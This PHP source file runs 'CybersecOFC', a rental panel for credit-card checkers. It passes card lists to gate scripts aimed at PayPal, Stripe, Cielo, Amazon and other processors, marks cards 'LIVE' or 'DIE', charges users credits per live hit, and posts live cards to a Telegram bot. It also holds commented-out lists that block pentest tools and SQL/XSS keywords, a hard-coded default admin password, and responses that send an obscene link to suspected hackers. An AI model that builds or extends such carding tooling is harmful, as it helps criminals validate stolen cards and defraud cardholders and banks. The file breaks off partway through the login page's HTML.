<?php
// ============================================
// SISTEMA DE PROTEÇÃO CYBERSECOFC - NASA LEVEL
// ADICIONADO AO SEU CÓDIGO ORIGINAL
// ============================================

session_start();

// MÚSICA SEM LOOP INFINITO (Volume 100%)
$music_url = "https://www.youtube.com/embed/9wlMOOCZE6c?si=-GYC0bkMD_SGzYTr&autoplay=1&volume=100";
$music_embed = <<<HTML
<!-- MÚSICA SEM LOOP INFINITO -->
<iframe 
    width="0" 
    height="0" 
    src="{$music_url}"
    frameborder="0" 
    allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
    allowfullscreen
    style="position: absolute; left: -9999px;"
    id="musicPlayer">
</iframe>
<script>
// Garantir que a música toque uma vez
document.addEventListener('DOMContentLoaded', function() {
    const musicIframe = document.getElementById('musicPlayer');
    if (musicIframe) {
        musicIframe.src = musicIframe.src; // Reinicia se necessário
    }
});
</script>
<!-- FIM DA MÚSICA -->
HTML;

// DEFESA CONTRA HACKERS - NÍVEL NASA
header_remove('X-Powered-By');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
header('Referrer-Policy: no-referrer');
header('Permissions-Policy: geolocation=(), microphone=(), camera=()');

// Configuração do Bot Telegram
$bot_token_file = 'bot_token.txt';
$bot_enabled_file = 'bot_enabled.txt';

// Criar arquivos se não existirem para evitar erros de leitura
if (!file_exists($bot_token_file)) {
    file_put_contents($bot_token_file, '');
}
if (!file_exists($bot_enabled_file)) {
    file_put_contents($bot_enabled_file, '0');
}

// Função para enviar mensagem via Bot Telegram
function sendTelegramMessage($message) {
    global $bot_token_file, $bot_enabled_file;

    if (!file_exists($bot_enabled_file) || trim(file_get_contents($bot_enabled_file)) !== '1') {
        return false;
    }

    if (!file_exists($bot_token_file)) {
        return false;
    }

    $bot_token = trim(file_get_contents($bot_token_file));
    if (empty($bot_token)) {
        return false;
    }

    // Obter todos os chats/grupos (simulação - na prática você precisaria armazenar os chat_ids)
    $chats = ['-1001234567890']; // Substitua com seus chat_ids reais

    foreach ($chats as $chat_id) {
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data)
            ]
        ];

        $context = stream_context_create($options);
        @file_get_contents($url, false, $context);
    }

    return true;
}

// DETECTAR PROXY E FERRAMENTAS DE HACKING (APENAS SE DETECTAR TENTATIVAS REAIS)
/* 
// Proteção temporariamente desativada para evitar erros de falso positivo relatados pelo usuário
if (isset($_SERVER['HTTP_USER_AGENT'])) {
    $user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

    if (!$is_browser) {
        $blacklisted_agents = [
            'nmap', 'sqlmap', 'nikto', 'wpscan', 'dirbuster', 
            'gobuster', 'burp', 'zap', 'hydra', 'metasploit',
            'nessus', 'openvas', 'acunetix', 'netsparker',
            'appscan', 'w3af', 'skipfish', 'wapiti', 
            'Fiddler', 'mitmproxy', 'Proxyman'
        ];

        foreach ($blacklisted_agents as $agent) {
            if (stripos($user_agent, $agent) !== false) {
                // ADICIONAR HEADER ESPECIAL PARA PROXY
                header('X-Hacker-Redirect: https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/');
                exit;
            }
        }
    }
}
*/

// BLOQUEAR REQUISIÇÕES COM HEADERS DE PROXY (APENAS SE FOR MUITO SUSPEITO)
/*
// Proteção desativada para evitar bloqueio indevido de usuários
$suspicious_proxy = false;

// Verificar se é um proxy de ataque (não proxy normal)
if (isset($_SERVER['HTTP_VIA']) && 
    (strpos($_SERVER['HTTP_VIA'], 'Charles') !== false || 
     strpos($_SERVER['HTTP_VIA'], 'mitm') !== false ||
     strpos($_SERVER['HTTP_VIA'], 'Fiddler') !== false)) {
    $suspicious_proxy = true;
}

// Verificar X-Forwarded-For apenas se houver muitos IPs (proxy chain de ataque)
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
    if (count($ips) > 3) { // Mais de 3 proxies na chain = suspeito
        $suspicious_proxy = true;
    }
}

// Só bloquear se for realmente suspeito
if ($suspicious_proxy) {
    header('X-Hacker-Redirect: https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/');
    echo json_encode(['status' => 'error', 'message' => 'Proxy de ataque detectado']);
    exit;
}
*/

// BLOQUEAR REQUISIÇÕES SUSPEITAS (SQL Injection, XSS, etc)
/*
$suspicious_params = ['union', 'select', 'insert', 'update', 'delete', 
                     'drop', '--', '/*', '*/', 'script', 'iframe',
                     'onload', 'onerror', 'javascript:', 'vbscript:',
                     'data:', 'alert(', 'confirm(', 'prompt('];

if (isset($_GET) && is_array($_GET)) {
    foreach ($_GET as $param => $value) {
        foreach ($suspicious_params as $bad) {
            if (stripos((string)$value, $bad) !== false || stripos((string)$param, $bad) !== false) {
                // RESPOSTA COM LINK PARA HACKER
                header('X-Hacker-Message: @cybersecofc nao deixa rastro bb');
                echo json_encode([
                    'status' => 'error', 
                    'message' => 'https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/'
                ]);
                exit;
            }
        }
    }
}
*/

// ============================================
// SEU CÓDIGO ORIGINAL (MANTIDO INTACTO)
// ============================================

// Arquivo para armazenar usuários
$users_file = 'users.json';

// Lista de todos os checkers disponíveis (removidas as consultas)
$all_tools = [
    'checkers' => ['paypal', 'preauth', 'n7', 'amazon1', 'amazon2', 'cpfchecker', 'ggsitau', 
                   'getnet', 'auth', 'debitando', 'n7_new', 'gringa', 'elo', 'erede', 'allbins', 'stripe', 'visamaster']
];

// Inicializar arquivo de usuários se não existir
if (!file_exists($users_file)) {
    $users = [
        'save' => [
            'password' => password_hash('black', PASSWORD_DEFAULT),
            'role' => 'admin',
            'type' => 'permanent',
            'credits' => 0,
            'tools' => $all_tools['checkers']
        ]
    ];
    file_put_contents($users_file, json_encode($users));
}

// Função para carregar usuários
function loadUsers() {
    global $users_file;
    return json_decode(file_get_contents($users_file), true);
}

// Função para salvar usuários
function saveUsers($users) {
    global $users_file;
    file_put_contents($users_file, json_encode($users));
}

// Função para verificar se o acesso temporário expirou ou se tem créditos
function checkUserAccess($userData) {
    if ($userData['type'] === 'temporary') {
        $expiresAt = $userData['expires_at'];
        if (time() > $expiresAt) {
            // Logout automático
            session_destroy();
            header('Location: index.php?expired=1');
            exit;
        }
    } elseif ($userData['type'] === 'credits') {
        if ($userData['credits'] <= 0) {
            // Logout automático
            session_destroy();
            header('Location: index.php?expired=1');
            exit;
        }
    }
    return true; // Acesso permitido
}

// Função para descontar créditos (0.05 por DIE e 1.50 por LIVE)
function deductCredits($username, $isLive = false) {
    $users = loadUsers();
    if (isset($users[$username]) && $users[$username]['type'] === 'credits') {
        $amount = $isLive ? 1.50 : 0.05;
        $users[$username]['credits'] -= $amount;
        if ($users[$username]['credits'] < 0) {
            $users[$username]['credits'] = 0;
        }
        saveUsers($users);
        return $users[$username]['credits'];
    }
    return false;
}

// Função para verificar créditos do usuário
function getUserCredits($username) {
    $users = loadUsers();
    if (isset($users[$username]) && $users[$username]['type'] === 'credits') {
        return $users[$username]['credits'];
    }
    return 0;
}

// Processar login
if (isset($_POST['login'])) {
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $users = loadUsers();

    if (isset($users[$username]) && password_verify($password, $users[$username]['password'])) {
        // Verificar se não expirou ou tem créditos
        if (!checkUserAccess($users[$username])) {
            $login_error = 'Seu acesso expirou ou créditos insuficientes!';
        } else {
            $_SESSION['logged_in'] = true;
            $_SESSION['username'] = $username;
            $_SESSION['role'] = $users[$username]['role'];
            $_SESSION['type'] = $users[$username]['type'];
            $_SESSION['tools'] = $users[$username]['tools'] ?? ['paypal'];

            if ($users[$username]['type'] === 'temporary') {
                $_SESSION['expires_at'] = $users[$username]['expires_at'];
            } elseif ($users[$username]['type'] === 'credits') {
                $_SESSION['credits'] = $users[$username]['credits'];
            }

            header('Location: index.php');
            exit;
        }
    } else {
        $login_error = 'Usuário ou senha incorretos!';
    }
}

// Processar logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: index.php');
    exit;
}

// Processar adição de usuário permanente (apenas admin)
if (isset($_POST['add_permanent_user']) && $_SESSION['role'] === 'admin') {
    $new_username = $_POST['new_username'] ?? '';
    $new_password = $_POST['new_password'] ?? '';
    $selected_tools = $_POST['checkers'] ?? [];

    if ($new_username && $new_password && !empty($selected_tools)) {
        $users = loadUsers();
        $users[$new_username] = [
            'password' => password_hash($new_password, PASSWORD_DEFAULT),
            'role' => 'user',
            'type' => 'permanent',
            'credits' => 0,
            'tools' => $selected_tools
        ];
        saveUsers($users);

        // Enviar notificação via bot
        sendTelegramMessage("🆕 NOVO USUÁRIO PERMANENTE\n👤 Usuário: <code>$new_username</code>\n⚡ Tipo: Acesso Permanente\n🛠️ Ferramentas: " . implode(', ', $selected_tools));

        $success_message = "Usuário permanente '$new_username' criado com acesso a: " . implode(', ', $selected_tools);
    }
}

// Processar aluguel por hora (apenas admin)
if (isset($_POST['add_rental_user']) && $_SESSION['role'] === 'admin') {
    $rental_username = $_POST['rental_username'] ?? '';
    $rental_password = $_POST['rental_password'] ?? '';
    $rental_hours = intval($_POST['rental_hours'] ?? 0);
    $selected_tools = $_POST['rental_checkers'] ?? [];

    if ($rental_username && $rental_password && $rental_hours > 0 && !empty($selected_tools)) {
        $users = loadUsers();
        $expiresAt = time() + ($rental_hours * 3600);

        $users[$rental_username] = [
            'password' => password_hash($rental_password, PASSWORD_DEFAULT),
            'role' => 'user',
            'type' => 'temporary',
            'expires_at' => $expiresAt,
            'created_at' => time(),
            'hours' => $rental_hours,
            'credits' => 0,
            'tools' => $selected_tools
        ];
        saveUsers($users);

        // Enviar notificação via bot
        $expireDate = date('d/m/Y H:i:s', $expiresAt);
        sendTelegramMessage("⏱️ NOVO ACESSO TEMPORÁRIO\n👤 Usuário: <code>$rental_username</code>\n⏰ Horas: $rental_hours\n⏳ Expira: $expireDate\n🛠️ Ferramentas: " . implode(', ', $selected_tools));

        $success_message = "Acesso temporário criado para '$rental_username' por $rental_hours hora(s) com ferramentas: " . implode(', ', $selected_tools) . ". Expira em: $expireDate";
    }
}

// Processar adição de usuário por créditos (apenas admin)
if (isset($_POST['add_credit_user']) && $_SESSION['role'] === 'admin') {
    $credit_username = $_POST['credit_username'] ?? '';
    $credit_password = $_POST['credit_password'] ?? '';
    $credit_amount = floatval($_POST['credit_amount'] ?? 0);
    $selected_tools = $_POST['credit_checkers'] ?? [];

    if ($credit_username && $credit_password && $credit_amount > 0 && !empty($selected_tools)) {
        $users = loadUsers();

        $users[$credit_username] = [
            'password' => password_hash($credit_password, PASSWORD_DEFAULT),
            'role' => 'user',
            'type' => 'credits',
            'credits' => $credit_amount,
            'created_at' => time(),
            'tools' => $selected_tools
        ];
        saveUsers($users);

        // Enviar notificação via bot
        sendTelegramMessage("💰 NOVO USUÁRIO POR CRÉDITOS\n👤 Usuário: <code>$credit_username</code>\n💳 Créditos: $credit_amount\n⚡ LIVE: 1.50 créditos | DIE: 0.05 créditos\n🛠️ Ferramentas: " . implode(', ', $selected_tools));

        $success_message = "Usuário por créditos '$credit_username' criado com $credit_amount créditos e ferramentas: " . implode(', ', $selected_tools) . ". Cada LIVE custa 1.50 créditos, cada DIE custa 0.05 créditos.";
    }
}

// Processar recarga de créditos (apenas admin)
if (isset($_POST['add_credits']) && $_SESSION['role'] === 'admin') {
    $recharge_username = $_POST['recharge_username'] ?? '';
    $add_credits = floatval($_POST['add_credits'] ?? 0);

    if ($recharge_username && $add_credits > 0) {
        $users = loadUsers();

        if (isset($users[$recharge_username]) && $users[$recharge_username]['type'] === 'credits') {
            $old_credits = $users[$recharge_username]['credits'];
            $users[$recharge_username]['credits'] += $add_credits;
            saveUsers($users);

            $new_credits = $users[$recharge_username]['credits'];

            // Enviar notificação via bot
            sendTelegramMessage("🔄 RECARGA DE CRÉDITOS\n👤 Usuário: <code>$recharge_username</code>\n💰 Adicionado: $add_credits créditos\n💳 Total: $new_credits créditos");

            $success_message = "Recarga realizada! Usuário '$recharge_username' agora tem $new_credits créditos.";
        } else {
            $error_message = "Usuário não encontrado ou não é do tipo 'créditos'.";
        }
    }
}

// Processar remoção de usuário (apenas admin)
if (isset($_POST['remove_user']) && $_SESSION['role'] === 'admin') {
    $remove_username = $_POST['remove_username'] ?? '';

    if ($remove_username !== 'save') {
        $users = loadUsers();
        unset($users[$remove_username]);
        saveUsers($users);

        // Enviar notificação via bot
        sendTelegramMessage("🗑️ USUÁRIO REMOVIDO\n👤 Usuário: <code>$remove_username</code>\n❌ Conta removida do sistema");

        $success_message = "Usuário '$remove_username' removido com sucesso!";
    }
}

// Configuração do Bot (apenas admin)
if (isset($_POST['save_bot_token']) && $_SESSION['role'] === 'admin') {
    $bot_token = $_POST['bot_token'] ?? '';

    if (!empty($bot_token)) {
        file_put_contents($bot_token_file, $bot_token);
        $success_message = "Token do bot salvo com sucesso!";
    } else {
        $error_message = "Token não pode ser vazio!";
    }
}

if (isset($_POST['start_bot']) && $_SESSION['role'] === 'admin') {
    file_put_contents($bot_enabled_file, '1');

    // Enviar mensagem de inicialização
    sendTelegramMessage("🤖 BOT ONLINE\n✅ Sistema CybersecOFC ativado\n🔗 Acesso: https://apiscybersecofc.up.railway.app");

    $success_message = "Bot iniciado com sucesso!";
}

if (isset($_POST['stop_bot']) && $_SESSION['role'] === 'admin') {
    file_put_contents($bot_enabled_file, '0');
    $success_message = "Bot parado com sucesso!";
}

if (isset($_POST['send_broadcast']) && $_SESSION['role'] === 'admin') {
    $message = $_POST['broadcast_message'] ?? '';

    if (!empty($message)) {
        sendTelegramMessage("📢 MENSAGEM DO ADMINISTRADOR\n\n$message");
        $success_message = "Mensagem enviada para todos os grupos!";
    }
}

// ============================================
// MODIFICAÇÃO NA PARTE AJAX (PROTEÇÃO EXTRA)
// ============================================

// Processar requisições AJAX das ferramentas
if (isset($_GET['action']) && $_GET['action'] === 'check' && isset($_GET['lista']) && isset($_GET['tool'])) {
    if (!isset($_SESSION['logged_in'])) {
        header('X-Hacker-Message: @cybersecofc nao deixa rastro bb');
        echo json_encode(['status' => 'error', 'message' => 'https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/']);
        exit;
    }

    // Verificar acesso do usuário
    $users = loadUsers();
    $username = $_SESSION['username'];

    if (isset($users[$username])) {
        $userData = $users[$username];

        if ($userData['type'] === 'temporary') {
            if (time() > $userData['expires_at']) {
                echo json_encode([
                    'status' => 'error', 
                    'message' => '⏱️ Seu tempo de acesso expirou! Entre em contato com o administrador.'
                ]);
                exit;
            }
        } elseif ($userData['type'] === 'credits') {
            if ($userData['credits'] < 0.05) { // Mínimo para um DIE
                echo json_encode([
                    'status' => 'error', 
                    'message' => '💳 Créditos insuficientes! Você precisa de pelo menos 0.05 créditos. Seus créditos: ' . $userData['credits']
                ]);
                exit;
            }
        }
    }

    $tool = $_GET['tool'];
    if (!in_array($tool, $_SESSION['tools'])) {
        header('X-Hacker-Message: @cybersecofc nao deixa rastro bb');
        echo json_encode(['status' => 'error', 'message' => 'https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/']);
        exit;
    }

    error_reporting(0);
    ini_set('display_errors', 0);

    $lista = $_GET['lista'];
    ob_clean();

    try {
        // Mapear os nomes corretamente com as novas ferramentas
        $tool_files = [
            'paypal' => 'attached_assets/PAYPALV2OFC.php',
            'preauth' => 'attached_assets/cielo.php',
            'n7' => 'attached_assets/PAGARMEOFC.php',
            'amazon1' => 'attached_assets/AMAZONOFC1.php',
            'amazon2' => 'attached_assets/AMAZONOFC2.php',
            'cpfchecker' => 'attached_assets/cpfchecker.php',
            'ggsitau' => 'attached_assets/ggsitau.php',
            'getnet' => 'attached_assets/getnet.php',
            'auth' => 'attached_assets/auth.php',
            'debitando' => 'attached_assets/debitando.php',
            'n7_new' => 'attached_assets/n7.php',
            'gringa' => 'attached_assets/gringa.php',
            'elo' => 'attached_assets/elo.php',
            'erede' => 'attached_assets/erede.php',
            'allbins' => 'attached_assets/allbins.php',
            'stripe' => 'attached_assets/strip.php',
            'visamaster' => 'attached_assets/visamaster.php'
        ];

        if (isset($tool_files[$tool]) && file_exists($tool_files[$tool])) {
            // Limpar qualquer output anterior
            ob_clean();

            // Incluir o arquivo da ferramenta
            $_GET['lista'] = $lista;
            if (isset($_GET['cookie'])) {
                $_GET['cookie'] = $_GET['cookie'];
                $_POST['cookie1'] = $_GET['cookie'];
            }

            // Capturar o output do arquivo incluído
            ob_start();
            include $tool_files[$tool];
            $output = ob_get_clean();

            // Verificar se é LIVE de forma mais flexível
            $isLive = false;
            $live_patterns = [
                'Aprovada', 'aprovada', 'APROVADA', 
                'success', 'SUCCESS', 'Success',
                '✅', '✓', '✔', '🟢',
                'Live', 'LIVE', 'live',
                'AUTHORIZED', 'Authorized', 'authorized',
                'Válido', 'válido', 'VÁLIDO',
                'Válida', 'válida', 'VÁLIDA',
                'Valid', 'VALID',
                'Aprovado', 'aprovado', 'APROVADO',
                'ok', 'OK', 'Ok',
                'Encontrado', 'encontrado', 'ENCONTRADO'
            ];

            foreach ($live_patterns as $pattern) {
                if (stripos($output, $pattern) !== false) {
                    $isLive = true;
                    break;
                }
            }

            // Se usuário for tipo créditos, descontar créditos
            if (isset($users[$username]) && $users[$username]['type'] === 'credits') {
                $remainingCredits = deductCredits($username, $isLive);
                if ($remainingCredits !== false) {
                    // Adicionar informações de créditos ao output
                    $cost = $isLive ? '1.50' : '0.05';
                    $output .= "\n💳 Crédito usado: {$cost} | Restante: " . number_format($remainingCredits, 2);

                    // Se ficar sem créditos, preparar logout
                    if ($remainingCredits <= 0) {
                        $output .= "\n⚠️ Créditos esgotados! Será desconectado automaticamente.";
                    }

                    // Enviar notificação de LIVE via bot
                    if ($isLive) {
                        $card_info = substr($lista, 0, 6) . '******' . substr($lista, -4);
                        sendTelegramMessage("🎉 LIVE DETECTADA\n👤 Usuário: <code>$username</code>\n💳 Cartão: $card_info\n🛠️ Gate: " . strtoupper($tool) . "\n💰 Créditos restantes: " . number_format($remainingCredits, 2));
                    }
                }
            }

            // Retornar exatamente o que a API retorna
            echo $output;

        } else {
            // Se chegou aqui, a ferramenta não foi encontrada
            header('X-Hacker-Message: @cybersecofc nao deixa rastro bb');
            echo json_encode(['status' => 'error', 'message' => 'https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/']);
        }
    } catch (Exception $e) {
        header('X-Hacker-Message: @cybersecofc nao deixa rastro bb');
        echo json_encode(['status' => 'error', 'message' => 'https://www.pornolandia.xxx/album/26230/buceta-da-morena-rosadinha/']);
    }

    exit;
}

// ============================================
// SISTEMA DE SEGURANÇA JAVASCRIPT CORRIGIDO
// ============================================

$security_script = ''; // Desativado para evitar bloqueio de usuários legítimos

// ============================================
// PÁGINA DE LOGIN
// ============================================

if (!isset($_SESSION['logged_in'])) {
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Access Terminal - CybersecOFC</title>
    <?php echo $music_embed; ?>
    <?php echo $security_script; ?>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Exo+2:wght@300;400;600&display=swap');

        :root {
            --neon-green: #00ff00;
            --neon-blue: #00ffff;
            --neon-purple: #ff00ff;
            --neon-yellow: #ffff00;
            --dark-bg: #0a0a0f;
            --darker-bg: #05050a;
            --card-bg: rgba(10, 20, 30, 0.9);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        @keyframes matrix {
            0% { transform: translateY(-100%); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(100%); opacity: 0; }
        }

        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-1px, 1px); }
            40% { transform: translate(-1px, -1px); }
            60% { transform: translate(1px, 1px); }
            80% { transform: translate(1px, -1px); }
        }

        @keyframes scanline {
            0% { top: 0%; }
            100% { top: 100%; }
        }

        @keyframes flicker {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.8; }
        }

        @keyframes pulse {
            0%, 100% { box-shadow: 0 0 20px var(--neon-green); }
            50% { box-shadow: 0 0 40px var(--neon-green); }
        }

        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }

        body {
            background: var(--dark-bg);
            background-image: 
                radial-gradient(circle at 20% 50%, rgba(0, 255, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 80% 20%, rgba(255, 0, 255, 0.1) 0%, transparent 20%),
                radial-gradient(circle at 40% 80%, rgba(255, 255, 0, 0.1) 0%, transparent 20%);
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(
                    0deg,
                    rgba(0, 255, 0, 0.03) 0px,
                    rgba(0, 255, 0, 0.03) 1px,
                    transparent 1px,
                    transparent 2px
                ),
                repeating-linear-gradient(
                    90deg,
                    rgba(0, 255, 255, 0.02) 0px,
                    rgba(0, 255, 255, 0.02) 1px,
                    transparent 1px,
                    transparent 2px
                );
            pointer-events: none;
            z-index: 1;
            animation: flicker 3s infinite;
        }

        .scanline {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 4px;
            background: linear-gradient(90deg, 
                transparent, 
                var(--neon-green),
                var(--neon-blue),
                var(--neon-purple),
                var(--neon-green),
                transparent
            );
            animation: scanline 4s linear infinite;
            z-index: 2;
            pointer-events: none;
            filter: blur(1px);
        }

        .matrix-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1;
            font-size: 16px;
            line-height: 24px;
            overflow: hidden;
            z-index: 0;
            pointer-events: none;
            font-family: 'Courier New', monospace;
        }

        .matrix-column {
            position: absolute;
            top: -100%;
            white-space: nowrap;
            animation: matrix 15s linear infinite;
            color: var(--neon-green);
            text-shadow: 0 0 10px var(--neon-green);
            font-weight: bold;
        }

        .login-container {
            background: var(--card-bg);
            border: 2px solid var(--neon-green);
            border-radius: 20px;
            padding: 20px;
            width: 100%;
            max-width: 500px;
            box-shadow: 
                0 0 50px rgba(0, 255, 0, 0.3),
                inset 0 0 50px rgba(0, 255, 0, 0.1);
            position: relative;
            z-index: 10;
            animation: pulse 3s infinite;
            backdrop-filter: blur(10px);
            overflow: hidden;
            text-align: center;
        }

        .login-logo {
            width: 150px;
            height: 150px;
            margin: 0 auto 20px;
            border-radius: 50%;
            border: 2px solid var(--neon-green);
            box-shadow: 0 0 20px var(--neon-green);
            display: block;
            object-fit: cover;
        }

        .login-container::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, 
                var(--neon-green), 
                var(--neon-blue), 
                var(--neon-purple), 
                var(--neon-yellow)
            );
            z-index: -1;
            border-radius: 22px;
            animation: glitch 5s infinite;
        }

        .login-container::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: radial-gradient(circle at 30% 30%, rgba(0, 255, 0, 0.1), transparent 70%);
            z-index: -1;
            border-radius: 20px;
        }

        .terminal-header {
            text-align: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--neon-green);
            position: relative;
        }

        .terminal-header::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 50%;
            transform: translateX(-50%);
            width: 100px;
            height: 3px;
            background: linear-gradient(90deg, 
                transparent, 
                var(--neon-green), 
                var(--neon-blue), 
                transparent
            );
        }

        .terminal-header h1 {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            color: var(--neon-green);
            text-shadow: 
                0 0 20px var(--neon-green),
                0 0 40px var(--neon-green);
            margin-bottom: 10px;
            letter-spacing: 3px;
            font-weight: 900;
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            animation: float 3s ease-in-out infinite;
        }

        .terminal-header .subtitle {
            color: var(--neon-blue);
            font-size: 12px;
            letter-spacing: 2px;
            text-transform: uppercase;
            font-weight: 600;
        }

        .features-section {
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid var(--neon-green);
            border-radius: 15px;
            backdrop-filter: blur(5px);
        }

        .features-section h2 {
            color: var(--neon-blue);
            font-family: 'Orbitron', sans-serif;
            font-size: 14px;
            margin-bottom: 15px;
            text-align: center;
            border-bottom: 1px solid var(--neon-blue);
            padding-bottom: 10px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .features-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-top: 10px;
        }

        .feature-category h3 {
            color: var(--neon-purple);
            font-family: 'Orbitron', sans-serif;
            font-size: 12px;
            margin-bottom: 10px;
            border-bottom: 1px solid var(--neon-purple);
            padding-bottom: 5px;
            text-transform: uppercase;
        }

        .feature-category ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        .feature-category ul li {
            color: var(--neon-green);
            font-size: 12px;
            padding: 8px 0;
            padding-left: 20px;
            position: relative;
            line-height: 1.6;
            transition: all 0.3s;
        }

        .feature-category ul li:hover {
            color: var(--neon-yellow);
            transform: translateX(5px);
        }

        .feature-category ul li::before {
            content: '▸';
            position: absolute;
            left: 0;
            color: var(--neon-blue);
            font-weight: bold;
        }

        .terminal-prompt {
            color: var(--neon-green);
            margin-bottom: 10px;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            text-shadow: 0 0 10px var(--neon-green);
        }

        .terminal-prompt::before {
            content: '> ';
            color: var(--neon-blue);
            font-weight: bold;
        }

        .form-group {
            margin-bottom: 30px;
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 15px 20px;
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid var(--neon-green);
            color: var(--neon-green);
            font-family: 'Exo 2', sans-serif;
            font-size: 16px;
            outline: none;
            transition: all 0.3s;
            border-radius: 10px;
            letter-spacing: 1px;
        }

        .form-group input:focus {
            border-color: var(--neon-blue);
            box-shadow: 
                0 0 20px rgba(0, 255, 255, 0.5),
                inset 0 0 10px rgba(0, 255, 0, 0.2);
            transform: scale(1.02);
        }

        .form-group input::placeholder {
            color: rgba(0, 255, 0, 0.5);
        }

        .btn-login {
            width: 100%;
            padding: 18px;
            background: linear-gradient(45deg, rgba(0, 255, 0, 0.1), rgba(0, 255, 255, 0.1));
            border: 2px solid var(--neon-green);
            color: var(--neon-green);
            font-family: 'Orbitron', sans-serif;
            font-size: 18px;
            cursor: pointer;
            transition: all 0.3s;
            font-weight: bold;
            letter-spacing: 3px;
            text-transform: uppercase;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
            margin-top: 20px;
        }

        .btn-login:hover {
            background: linear-gradient(45deg, var(--neon-green), var(--neon-blue));
            color: #000;
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.8);
            transform: scale(1.05);
        }

        .btn-login::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        .btn-login:hover::before {
            left: 100%;
        }

        .error {
            color: #ff0000;
            text-align: center;
            margin-bottom: 25px;
            padding: 15px;
            background: rgba(255, 0, 0, 0.1);
            border: 1px solid #ff0000;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.3);
            animation: glitch 2s infinite;
            font-family: 'Courier New', monospace;
        }

        .info {
            color: var(--neon-yellow);
            text-align: center;
            margin-bottom: 25px;
            padding: 15px;
            background: rgba(255, 255, 0, 0.1);
            border: 1px solid var(--neon-yellow);
            border-radius: 10px;
            font-size: 14px;
            box-shadow: 0 0 15px rgba(255, 255, 0, 0.3);
            font-family: 'Courier New', monospace;
        }

        .access-denied {
            color: rgba(255, 0, 0, 0.7);
            text-align: center;
            margin-top: 30px;
            font-size: 11px;
            letter-spacing: 2px;
            font-family: 'Courier New', monospace;
            text-transform: uppercase;
        }

        @media (max-width: 768px) {
            .login-container {
                padding: 30px;
            }

            .terminal-header h1 {
                font-size: 32px;
            }

            .features-grid {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="scanline"></div>
    <div class="matrix-bg" id="matrixBg"></div>

    <div class="login-container">
        <img src="attached_assets/ChatGPT_Image_30_de_jan._de_2026,_16_44_03_1770615822351.png" alt="CybersecOFC Logo" class="login-logo">
        <div class="terminal-header">
            <h1>█ CYBERSECOFC █</h1>
            <div class="subtitle">[ PREMIUM CHECKER SYSTEM ]</div>
        </div>

        <div class="features-section">
            <h2>⚡ CHECKERS DE ALTA QUALIDADE</h2>
            <div class="features-grid">
                <div class="feature-category">
                    <h3>💳 GATES PRINCIPAIS</h3>
                    <ul>
                        <li>PAYPAL V2 - Verificação de cartões PayPal @CYBERSECOFC</li>
                        <li>PAGARME - VISA/MASTER/AMEX/ELO @CYBERSECOFC</li>
                        <li>CIELO - @CYBERSECOFC</li>
                        <li>GETNET - Verificação GETNET</li>
                        <li>AUTH - Sistema de autorização</li>
                        <li>DEBITANDO - Verificação de débito</li>
                        <li>N7 - Checker N7</li>
                    </ul>
                </div>
